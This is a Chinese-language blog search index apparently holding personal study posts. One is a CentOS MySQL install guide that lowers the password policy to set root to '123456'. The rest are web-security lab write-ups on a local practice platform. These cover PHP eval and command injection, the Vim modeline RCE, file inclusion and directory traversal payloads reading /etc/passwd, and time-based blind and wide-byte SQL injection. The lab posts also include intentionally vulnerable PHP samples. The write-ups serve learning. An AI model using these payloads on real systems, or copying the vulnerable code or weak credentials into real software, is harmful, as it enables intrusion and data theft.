<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[置顶]]></title>
    <url>%2F9102%2F01%2F01%2Ftop%2F</url>
    <content type="text"><![CDATA[该博客用于本人日常记录学习、复习过程，学习范围有Windows，Linux，安全，网络，C++，Python等内容，不定期更新！暂不开放评论功能（玻璃心）！]]></content>
  </entry>
  <entry>
    <title><![CDATA[Centos7安装Mysql5.7]]></title>
    <url>%2F2019%2F08%2F22%2FCentos7%E5%AE%89%E8%A3%85Mysql5-7%2F</url>
    <content type="text"><![CDATA[实验环境 Centos 7.2 MySql版本： 5.7.27 从CentOS 7.0发布以来，yum源中开始使用mariadb来代替MySQL的安装。即使你输入的是yum install mysql , 显示的也是mariadb的安装内容。因此，如果使用yum安装MySQL的话，就需要去下载官方指定的yum源。 卸载mariadb 检查是否已安装mariadb 12[root@bogon ~]# rpm -qa |grep mariadbmariadb-libs-5.5.44-2.el7.centos.x86_64 卸载已安装的mariadb 123456789101112131415161718192021222324252627282930313233343536373839404142[root@bogon ~]# yum -y remove mariadb*已加载插件：fastestmirror正在解决依赖关系--&gt; 正在检查事务---&gt; 软件包 mariadb-libs.x86_64.1.5.5.44-2.el7.centos 将被 删除--&gt; 正在处理依赖关系 libmysqlclient.so.18()(64bit)，它被软件包 2:postfix-2.10.1-6.el7.x86_64 需要--&gt; 正在处理依赖关系 libmysqlclient.so.18(libmysqlclient_18)(64bit)，它被软件包 2:postfix-2.10.1-6.el7.x86_64 需要--&gt; 正在检查事务---&gt; 软件包 postfix.x86_64.2.2.10.1-6.el7 将被 删除--&gt; 解决依赖关系完成依赖关系解决=========================================================================================================== Package 架构 版本 源 大小===========================================================================================================正在删除: mariadb-libs x86_64 1:5.5.44-2.el7.centos @anaconda 4.4 M为依赖而移除: postfix x86_64 2:2.10.1-6.el7 @anaconda 12 M事务概要===========================================================================================================移除 1 软件包 (+1 依赖软件包)安装大小：17 MDownloading packages:Running transaction checkRunning transaction testTransaction test succeededRunning transaction 正在删除 : 2:postfix-2.10.1-6.el7.x86_64 1/2 正在删除 : 1:mariadb-libs-5.5.44-2.el7.centos.x86_64 2/2 验证中 : 1:mariadb-libs-5.5.44-2.el7.centos.x86_64 1/2 验证中 : 2:postfix-2.10.1-6.el7.x86_64 2/2 删除: mariadb-libs.x86_64 1:5.5.44-2.el7.centos 作为依赖被删除: postfix.x86_64 2:2.10.1-6.el7 完毕！ 安装MySQL下载官方提供的rpm包进入目录/usr/local/src/ 1[root@bogon ~]# cd /usr/local/src/ 使用wget下载rpm包: 12345678910111213141516[root@bogon src]# wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm--2019-08-21 01:23:23-- https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm正在解析主机 dev.mysql.com (dev.mysql.com)... 137.254.60.11正在连接 dev.mysql.com (dev.mysql.com)|137.254.60.11|:443... 已连接。已发出 HTTP 请求，正在等待回应... 302 Found位置：https://repo.mysql.com//mysql57-community-release-el7-11.noarch.rpm [跟随至新的 URL]--2019-08-21 01:23:26-- https://repo.mysql.com//mysql57-community-release-el7-11.noarch.rpm正在解析主机 repo.mysql.com (repo.mysql.com)... 104.75.165.42正在连接 repo.mysql.com (repo.mysql.com)|104.75.165.42|:443... 已连接。已发出 HTTP 请求，正在等待回应... 200 OK长度：25680 (25K) [application/x-redhat-package-manager]正在保存至: “mysql57-community-release-el7-11.noarch.rpm”100%[=================================================================&gt;] 25,680 63.1KB/s 用时 0.4s 2019-08-21 01:23:28 (63.1 KB/s) - 已保存 “mysql57-community-release-el7-11.noarch.rpm” [25680/25680]) 安装rpm包： 12345[root@bogon src]# rpm -ivh mysql57-community-release-el7-11.noarch.rpm 警告：mysql57-community-release-el7-11.noarch.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEY准备中... ################################# [100%]正在升级/安装... 1:mysql57-community-release-el7-11 ################################# [100%] 检查mysql的yum源是否安装成功: 1234[root@bogon src]# yum repolist |grep mysqlmysql-connectors-community/x86_64 MySQL Connectors Community 118mysql-tools-community/x86_64 MySQL Tools Community 95mysql57-community/x86_64 MySQL 5.7 Community Server 364 使用yum安装mysql-server12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485[root@bogon ~]# yum -y install mysql-server已加载插件：fastestmirrorLoading mirror speeds from cached hostfile * c7-media: 正在解决依赖关系--&gt; 正在检查事务---&gt; 软件包 mysql-community-server.x86_64.0.5.7.27-1.el7 将被 安装--&gt; 正在处理依赖关系 mysql-community-common(x86-64) = 5.7.27-1.el7，它被软件包 mysql-community-server-5.7.27-1.el7.x86_64 需要--&gt; 正在处理依赖关系 mysql-community-client(x86-64) &gt;= 5.7.9，它被软件包 mysql-community-server-5.7.27-1.el7.x86_64 需要--&gt; 正在检查事务---&gt; 软件包 mysql-community-client.x86_64.0.5.7.27-1.el7 将被 安装--&gt; 正在处理依赖关系 mysql-community-libs(x86-64) &gt;= 5.7.9，它被软件包 mysql-community-client-5.7.27-1.el7.x86_64 需要---&gt; 软件包 mysql-community-common.x86_64.0.5.7.27-1.el7 将被 安装--&gt; 正在检查事务---&gt; 软件包 mariadb-libs.x86_64.1.5.5.44-2.el7.centos 将被 取代--&gt; 正在处理依赖关系 libmysqlclient.so.18()(64bit)，它被软件包 2:postfix-2.10.1-6.el7.x86_64 需要--&gt; 正在处理依赖关系 libmysqlclient.so.18(libmysqlclient_18)(64bit)，它被软件包 2:postfix-2.10.1-6.el7.x86_64 需要---&gt; 软件包 mysql-community-libs.x86_64.0.5.7.27-1.el7 将被 舍弃--&gt; 正在检查事务---&gt; 软件包 mysql-community-libs-compat.x86_64.0.5.7.27-1.el7 将被 舍弃--&gt; 解决依赖关系完成依赖关系解决=========================================================================================================== Package 架构 版本 源 大小===========================================================================================================正在安装: mysql-community-libs x86_64 5.7.27-1.el7 mysql57-community 2.2 M 替换 mariadb-libs.x86_64 1:5.5.44-2.el7.centos mysql-community-libs-compat x86_64 5.7.27-1.el7 mysql57-community 2.0 M 替换 mariadb-libs.x86_64 1:5.5.44-2.el7.centos mysql-community-server x86_64 5.7.27-1.el7 mysql57-community 165 M为依赖而安装: mysql-community-client x86_64 5.7.27-1.el7 mysql57-community 24 M mysql-community-common x86_64 5.7.27-1.el7 mysql57-community 275 k事务概要===========================================================================================================安装 3 软件包 (+2 依赖软件包)总计：194 M总下载量：194 MDownloading packages:Delta RPMs disabled because /usr/bin/applydeltarpm not installed.警告：/var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-5.7.27-1.el7.x86_64.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEYmysql-community-libs-5.7.27-1.el7.x86_64.rpm 的公钥尚未安装(1/4): mysql-community-libs-5.7.27-1.el7.x86_64.rpm | 2.2 MB 00:00:01 (2/4): mysql-community-libs-compat-5.7.27-1.el7.x86_64.rpm | 2.0 MB 00:00:04 (3/4): mysql-community-client-5.7.27-1.el7.x86_64.rpm | 24 MB 00:12:10 (4/4): mysql-community-server-5.7.27-1.el7.x86_64.rpm | 165 MB 01:32:23 -----------------------------------------------------------------------------------------------------------总计 36 kB/s | 194 MB 01:32:29 从 file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql 检索密钥导入 GPG key 0x5072E1F5: 用户ID : &quot;MySQL Release Engineering &lt;mysql-build@oss.oracle.com&gt;&quot; 指纹 : a4a9 4068 76fc bd3c 4567 70c8 8c71 8d3b 5072 e1f5 软件包 : mysql57-community-release-el7-11.noarch (installed) 来自 : /etc/pki/rpm-gpg/RPM-GPG-KEY-mysqlRunning transaction checkRunning transaction testTransaction test succeededRunning transaction警告：RPM 数据库已被非 yum 程序修改。 正在安装 : mysql-community-common-5.7.27-1.el7.x86_64 1/5 正在安装 : mysql-community-libs-5.7.27-1.el7.x86_64 2/5 正在安装 : mysql-community-client-5.7.27-1.el7.x86_64 3/5 正在安装 : mysql-community-server-5.7.27-1.el7.x86_64 4/5 正在安装 : mysql-community-libs-compat-5.7.27-1.el7.x86_64 5/5 验证中 : mysql-community-libs-compat-5.7.27-1.el7.x86_64 1/5 验证中 : mysql-community-common-5.7.27-1.el7.x86_64 2/5 验证中 : mysql-community-server-5.7.27-1.el7.x86_64 3/5 验证中 : mysql-community-client-5.7.27-1.el7.x86_64 4/5 验证中 : mysql-community-libs-5.7.27-1.el7.x86_64 5/5 已安装: mysql-community-libs.x86_64 0:5.7.27-1.el7 mysql-community-libs-compat.x86_64 0:5.7.27-1.el7 mysql-community-server.x86_64 0:5.7.27-1.el7 作为依赖被安装: mysql-community-client.x86_64 0:5.7.27-1.el7 mysql-community-common.x86_64 0:5.7.27-1.el7 完毕！ 查看版本信息： 1234567891011121314151617181920212223242526272829303132333435363738[root@bogon ~]# rpm -qi mysql-community-serverName : mysql-community-serverVersion : 5.7.27Release : 1.el7Architecture: x86_64Install Date: 2019年08月21日 星期三 01时53分15秒Group : Applications/DatabasesSize : 781829281License : Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved. Under GPLv2 license as shown in the Description field.Signature : DSA/SHA1, 2019年06月12日 星期三 14时43分04秒, Key ID 8c718d3b5072e1f5Source RPM : mysql-community-5.7.27-1.el7.src.rpmBuild Date : 2019年06月10日 星期一 23时04分00秒Build Host : loki10.no.oracle.comRelocations : (not relocatable)Packager : MySQL Release Engineering &lt;mysql-build@oss.oracle.com&gt;Vendor : Oracle and/or its affiliatesURL : http://www.mysql.com/Summary : A very fast and reliable SQL database serverDescription :The MySQL(TM) software delivers a very fast, multi-threaded, multi-user,and robust SQL (Structured Query Language) database server. MySQL Serveris intended for mission-critical, heavy-load production systems as wellas for embedding into mass-deployed software. MySQL is a trademark ofOracle and/or its affiliatesThe MySQL software has Dual Licensing, which means you can use the MySQLsoftware free of charge under the GNU General Public License(http://www.gnu.org/licenses/). You can also purchase commercial MySQLlicenses from Oracle and/or its affiliates if you do not wish to be bound by the terms ofthe GPL. See the chapter &quot;Licensing and Support&quot; in the manual forfurther info.The MySQL web site (http://www.mysql.com/) provides the latest news andinformation about the MySQL software. Also please see the documentationand the manual for more information.This package includes the MySQL server binary as well as related utilitiesto run and administer a MySQL server. MySQL基本配置启动mysql服务123456789101112131415[root@bogon ~]# systemctl start mysqld[root@bogon ~]# systemctl status mysqld● mysqld.service - MySQL Server Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled) Active: active (running) since 三 2019-08-21 05:43:05 CST; 8s ago Docs: man:mysqld(8) http://dev.mysql.com/doc/refman/en/using-systemd.html Process: 27032 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=0/SUCCESS) Process: 27015 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS) Main PID: 27036 (mysqld) CGroup: /system.slice/mysqld.service └─27036 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid8月 21 05:43:04 localhost.localdomain systemd[1]: Starting MySQL Server...8月 21 05:43:05 localhost.localdomain systemd[1]: Started MySQL Server. 使用初始密码登陆1234567891011121314151617[root@bogon ~]# cat /var/log/mysqld.log|grep &apos;A temporary password&apos;2019-08-20T20:16:55.163739Z 1 [Note] A temporary password is generated for root@localhost: MbM/x1miwUfW[root@localhost ~]# mysql -u root -pMbM/x1miwUfWmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 2Server version: 5.7.27 MySQL Community Server (GPL)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; 重置密码(登陆后必须先重置密码才可继续操作)alter user ‘root’@’localhost’ identified by ‘youpassword’; 123mysql&gt; alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos;yal7YyuBs(OL&apos; -&gt; ;Query OK, 0 rows affected (0.00 sec) 修改密码安全策略查看当前密码安全策略:SHOW VARIABLES LIKE &#39;validate_password%&#39;; 12345678910111213mysql&gt; SHOW VARIABLES LIKE &apos;validate_password%&apos;;+--------------------------------------+--------+| Variable_name | Value |+--------------------------------------+--------+| validate_password_check_user_name | OFF || validate_password_dictionary_file | || validate_password_length | 8 || validate_password_mixed_case_count | 1 || validate_password_number_count | 1 || validate_password_policy | MEDIUM || validate_password_special_char_count | 1 |+--------------------------------------+--------+7 rows in set (0.00 sec) validate_password_dictionary_file #参数是指定密码验证的字典文件路径validate_password_length #表示密码的长度，这个参数由下面的公式生成validate_password_mixed_case_count #表示密码中英文字符大小写的需求个数，当密码策略是MEDIUM或以上时生效。validate_password_number_count #表示密码中数字的需求个数validate_password_policy #这个参数可以设为0、1、2，分别代表从低到高的密码强度，此参数的默认值为1，如果想将密码强度改若，则更改此参数为0。validate_password_special_char_count 表示密码中特殊字符的需求个数 修改密码安全级别与密码长度限制： 1234mysql&gt; set global validate_password_policy=0;Query OK, 0 rows affected (0.00 sec)mysql&gt; set global validate_password_length=0;Query OK, 0 rows affected (0.00 sec) 修改密码为123456： 12mysql&gt; alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected (0.00 sec)]]></content>
      <categories>
        <category>LINUX</category>
        <category>系统服务</category>
      </categories>
      <tags>
        <tag>LANMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCE代码注入与远程命令执行]]></title>
    <url>%2F2019%2F08%2F19%2FRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.1.101/pika 漏洞概述 PHP代码执行漏洞则是可以把代码注入应用到网站后端代码中，如果漏洞没有特殊过滤，就相当于直接有一个Web后门存在，该漏洞主要由于动态代码执行函数的参数过滤不严谨导致。 在应用需要调用一些外部程序处理内容的情况下，就会用到一些执行系统命令函数，例如system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时将会注入恶意系统命令到正常命令中，造成命令执行功绩 常规eval代码注入eval函数可以把字符串按照php代码来执行，也就是说eval可以动态的执行php代码，代码示例如下：http://192.168.1.101/pika/vul/rce/rce_eval.php 1234567&lt;?phpif(isset($_POST['submit']) &amp;&amp; $_POST['txt'] != null)&#123; if(@！eval($_POST['txt']))&#123; $html.="&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;"; &#125;&#125;?&gt; 当代码被执行时，攻击者可以通过参数值来执行恶意代码，如下图所示，参数利用;分割php语句，执行phpinfo()函数。 远程命令执行一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 ，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 远程命令执行示例示例代码： 12345678910&lt;?phpif(isset($_POST['submit']) &amp;&amp; $_POST['ipaddress']!=null)&#123; $ip=$_POST['ipaddress']; if(stristr(php_uname('s'), 'windows'))&#123; //判断系统类型 $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理 &#125;else &#123; $result.=shell_exec('ping -c 4 '.$ip); &#125;&#125;?&gt; 当用户正常使用该命令接口时如下图所示：使用特殊符号拼接命令，使其起到查看当前目录下文件的功能：操作系统中的命令连接符： 123456&amp; &amp;&amp; | ||&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令&amp; 表示命令在后台执行| 将上一条命令的输出内容做为下一条命令的输入参数|| 表示上一条命令执行失败后，才执行下一条命令 代码加固12345678910111213141516171819&lt;?php$result='';if(isset($_POST['submit']) &amp;&amp; $_POST['ipaddress']!=null)&#123; $ip=$_POST['ipaddress']; $check=explode('.', $ip); //以.为分隔符，将IP分为4个字节 //检查每个字节是否都是整数，是否为4个字节 if ((is_numeric($check[0])) &amp;&amp; (is_numeric($check[1])) &amp;&amp; (is_numeric($check[2])) &amp;&amp; (is_numeric($check[3])) &amp;&amp; (sizeof($check) == 4) ) &#123; // 重新拼接4个字节为IP地址 $ip = $check[0].'.'.$check[1].'.'.$check[2].'.'.$check[3]; if(stristr(php_uname('s'), 'windows'))&#123; //判断系统类型 $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理 &#125;else &#123; $result.=shell_exec('ping -c 4 '.$ip); &#125; &#125;else&#123; print("请输入正确的IP地址"); &#125;&#125;?&gt; 代码加固效果如下图：]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-12735（Vim远程代码执行）漏洞复现]]></title>
    <url>%2F2019%2F08%2F05%2FCVE-2019-12735%EF%BC%88Vim%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[参考博客：https://blog.csdn.net/DarkHQ/article/details/92696160 一、实验环境 KaliLinux 2018 Vim 8.0.1401 二、漏洞影响版本 VIM &lt; 8.1.1365 Neovim &lt; 0.3.6 三、漏洞环境复现由于当前VIM版本没有默认开启modeline，需自己手动添加下，修改home/.vimrc文件，添加一条规则set modeline（如果没有.vimrc文件，自己手动创建一个）脚本是大佬pcy190编写的，链接：https://github.com/pcy190/ace-vim-neovim/一个尝试执行uname的poc，一个利用nc反弹shell的poc 四、漏洞复现侦听本机9999端口在一个新终端上使用VIM编辑poc_shell.txt 五、漏洞防护 更新vim到最新版本 禁用编辑器的 modeline功能，把set modeline 改为set nomodeline 利用vim编辑的时候，查看文件来源是否正规]]></content>
      <categories>
        <category>系统漏洞</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含与目录遍历]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%2F</url>
    <content type="text"><![CDATA[实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika漏洞概述 程序开发人员希望代码更加灵活，所以通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，用来进行动态调用，而无需再次编写，这种调用文件的过程被称为包含，但正是因为这种灵活性，导致客户端可以调用一个恶意文件，造成文件包含漏洞。 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对传入的的文件进行合理的校验或校验被绕过，从而导致攻击者可以通过修改文件的位置来让后台操作其他文件，因此导致意外的文件泄露甚至恶意的代码注入。 File include文件包含漏洞危害： include本地文件包含LFI； 远程系统文件包含RFI（可传入木马）通常为如include函数，可以将web根目录以外的目录包含进来。 形成漏洞根源：include函数对输入变量限制不严，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码 文件包含的函数： 1234require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。include()，找不到被包含的文件时只会产生警告，脚本将继续运行。include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 常见漏洞特征： http://xxx/index.php?page=a.phphttp://xxx/index.php?home=b.htmlhttp://xxx/index.php?file=content 漏洞测试方法：?page=/etc/passwd?page=../../../../../../../../../../../etc/passwd?page=http://192.168.0.13/a.php #类UNIX系统根目录：/目录层级分隔符：/ #windows系统根目录：C:\，D:\，E:\ 等目录层级分隔符：\或/ 示例代码: 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; $_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以通过修改$_GET[&#39;filename&#39;]的值，执行非预期的操作。 本地文件包含漏洞 本地文件包含示例代码示例：123456&lt;?phpif(isset($_GET['submit']) &amp;&amp; $_GET['filename']!=null)&#123; $filename=$_GET['filename']; include "include/$filename";//变量传进来直接包含,没做任何的安全限制&#125;?&gt; 正常访问网页，提交查询kobe访问的网页URL为:http://192.168.31.193/pika/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=提交查询当提交参数filename值修改为../../../../../../../../../../flag.txt时，则页面内容改编为flag.txt文件内容 远程文件包含漏洞PHP的配置文件(/etc/php5/cgi/php.ini )中的allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 远程文件包含示例代码示例：123456&lt;?phpif(isset($_GET['submit']) &amp;&amp; $_GET['filename']!=null)&#123; $filename=$_GET['filename']; include "include/$filename";//变量传进来直接包含,没做任何的安全限制&#125;?&gt; 建立站点用来远程文件包含漏洞中被包含，URL:http://192.168.31.193/7/cmd.txt通过远程文件包含漏洞，包含http://192.168.31.193/7/cmd.txt在webshell中执行系统命令，查看当前用户 Directory Traversal 目录遍历漏洞危害：本台机器操作系统上文件进行读取使用者可以通过浏览器/URL地址或者参数变量内容，可以读取web根目录【默认为:/var/www/】之外的其他操作系统文件(如：/etc/passwd/)。形成漏洞根源：目录权限限制不严格 目录遍历漏洞示例示例代码： 123456&lt;?phpif(isset($_GET['title']))&#123; $filename=$_GET['title']; //这里直接把传进来的内容进行了require(),造成问题 require "soup/$filename";?&gt; URL:http://192.168.31.193/pika/vul/dir/dir_list.php?title=jarheads.php 修改url中title参数的值为../../../../../../../../../../flag.txt]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>文件目录安全</category>
      </categories>
      <tags>
        <tag>文件目录安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL盲注进阶——BurpSuite]]></title>
    <url>%2F2019%2F08%2F01%2FSQL%E7%9B%B2%E6%B3%A8%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、Burpsuite——Intruder模块简介Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。 三、Intruder模块说明Burp Intruder主要有四个模块组成:1：Target 用于配置目标服务器进行攻击的详细信息。2：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。3：Payloads 设置payload，配置字典4：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 四、搭配Intruder自动爆破数据库 将截断的数据包发送至Intruder 设置Pyloads的插入点 设置Pyload，导入字典 启动自动攻击观察攻击运行至什么pyload时，会停留延时]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL盲注注入]]></title>
    <url>%2F2019%2F07%2F30%2FSQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、漏洞概述盲注是指数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或数据库执行延时等方法获取想要的信息。在一下几种情况中可能需要用到盲注手段： 部分网站没有输出显示，只能通过延时判断 不管正确或者错误的输入，都只显示两种情况 部分网站没办法 union select 联合查询方式注入 布尔盲注布尔盲注利用MySQL条件不成立时返回空内容，条件成立时返回正常数据的特点来进行攻击。比如MySQL中有一个substr函数，他可以截取M有SQL内部返回值与某一字符进行比较，通过遍历比较就可以还原出攻击者想得到的结果。 时间盲注同理，时间盲注通过substr截取字段返回信息的字符，通过一个个字符推算出最终的数据。和布尔盲注不同的是，时间盲注不是依据页面是否返回空内容来判断是否成立而是根据响应时间来判断。如果条件成立，页面就会比平时的响应速度更慢。 三、SQL语句原理 检测延时注入 12345678mysql&gt; select id,username from member where id=&apos;1&apos;union select 1,sleep(10);+----+----------+ | id | username |+----+----------+| 1 | vince || 1 | 0 |+----+----------+2 rows in set (10.00 sec) 猜测数据库长度 1234567891011121314151617181920212223242526mysql&gt; select database() -&gt; ;+------------+| database() |+------------+| pikachu |+------------+1 row in set (0.00 sec)mysql&gt; select id,username from member where id=&apos;1&apos;union select 2,sleep(if((length(database())=7),10,0));+----+----------+| id | username |+----+----------+| 1 | vince || 2 | 0 |+----+----------+2 rows in set (10.00 sec)mysql&gt; select id,username from member where id=&apos;1&apos;union select 2,sleep(if((length(database())=6),10,0));+----+----------+| id | username |+----+----------+| 1 | vince || 2 | 0 |+----+----------+2 rows in set (0.00 sec) if(条件,a,b)//若条件为TRUE则返回a,若条件为FALSE则返回b length(database()); //返回当前数据库名的长度 猜测数据库名称 123456789101112131415mysql&gt; select ascii(substr(database(),1,1));+-------------------------------+| ascii(substr(database(),1,1)) |+-------------------------------+| 112 |+-------------------------------+1 row in set (0.00 sec)mysql&gt; select id,username from member where id=&apos;i&apos; union select 1,if((ascii(substr(database(),1,1))=112),sleep(10),NULL);+----+----------+| id | username |+----+----------+| 1 | 0 |+----+----------+1 row in set (10.00 sec) substr(string,start,length) string:必选，被截取的字段 start:当该参数为正数时从字符串指定位置开始截取 当该参数为负数时从字符串结尾指定位置开始截取 length:需要截取的长度，缺省，即截取到结束位置。 ascii(str) 返回字符串最左边的字符的ascii码 四、布尔盲注实例 观察网页正常回显 在name=kobe后面加上一个“ &#39; ”，然后观察页面回显 出现这种情况就可能存在注入点，为确保准确性，猜测该位置的SQL查询语句就是用“ &#39; ”，进行闭合。修改URL为http://192.168.31.193/pika/vul/sqli/sqli_blind_b.php?name=kobe%27+--+&amp;submit=查询# 成功返回正常的页面，现在可以100%确定该网页存在注入漏洞，下面就可以进一步进行渗透 五、时间盲注检测 观察网页页面回显，发现无论提交什么参数都是相同的回显 构造延时查询的SQL语句进行注入 通过图5-7，可以说明该网站在返回请求时延时了10秒 猜测数据库名称长度在判断数据库名称为7时延时了10秒，证明当前数据库名称长度为7 猜测数据库名称中第一位字符体现在网页中就是当你猜中了数据库名的第1位，网页加载时间变长为10s；ascii 112=p]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL宽字节注入]]></title>
    <url>%2F2019%2F07%2F28%2FSQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、漏洞概述在实际环境中，程序员很少会写一点防护都没有的代码，宽字节注入源于程序员设置MySQL连接时错误配置为“set character_set_client=gbk”，这样配置会引发编码转换从而导致注入漏洞， 正常情况下，当GPC开启或使用addslashes函数过滤GET或POST提交的参数时，攻击者使用的“&#39;”就会被转义为“\‘”。 但如果存在宽字节注入%df%27时，首先经过单引号转义成%df%5c%27（%5c是反斜杠\，%27是单引号’），之后在数据库查询前使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为有个汉字。 然后MySQL服务器会对查询语句进行GBK编码，即%df%5c转换成汉字“運”，而单引号逃逸了出来从而照成注入漏洞。 三、实验准备在我们使用的PIKACHU漏洞练习平台中，宽字节注入实验默认关闭了MySQL的错误描述显示，为方便学习理解，需要开启MySQL的错误描述：修改\pika\vul\sqli\sqli_widebyte.php文件,将$result=mysqli_query($link, $query);修改为$result=execute($link, $query); 四、实验演示 检测注入点使用Burp截断转发功能修改报文将修改完毕后的报文发送给WEB服务器，观察网页回显 12341%df&apos;==1運 &apos;=\&apos; \==%5c %df%5c%27==運&apos; 猜测该网页SQL的查询语句为：select id,email from *** where ***=&#39;$name&#39; 构造SQL注入语句构造查看数据库与用户的SQL语句注入结果 五、理解代码原理与代码加固 代码理解与分析 123456789101112131415161718192021222324252627&lt;?php$link=connect();$html='';if(isset($_POST['submit']) &amp;&amp; $_POST['name']!=null)&#123; //escape在这的功能类似$name = addslashes($name) $name = escape($link,$_POST['name']); $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合 //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题 $set = "set character_set_client=gbk"; execute($link,$set); //mysqi_query不打印错误描述 